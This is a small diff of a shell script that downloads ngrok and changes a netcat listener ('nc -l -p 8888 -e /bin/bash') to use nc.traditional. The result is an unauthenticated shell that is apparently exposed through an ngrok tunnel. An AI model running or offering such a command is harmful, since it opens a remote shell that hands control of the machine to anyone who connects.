@@ -3,7 +3,7 @@
 wget -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
 unzip ngrok.zip
 {
-    nc -l -v -p 8888 -e /bin/bash
+    nc.traditional -l -v -p 8888 -e /bin/bash
     killall -SIGINT ngrok && echo "ngrok terminated"
 } &
 {
